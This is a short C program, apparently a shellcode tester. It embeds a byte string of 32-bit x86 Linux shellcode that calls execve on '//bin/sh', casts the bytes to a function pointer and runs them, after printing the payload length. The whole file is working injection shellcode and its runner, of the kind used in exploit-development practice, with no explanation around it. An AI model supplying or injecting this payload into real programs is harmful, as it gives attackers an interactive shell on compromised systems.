#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\xeb\x0b\x5b\x53\x8d\x0c\x24\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68";

void main(){
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

	
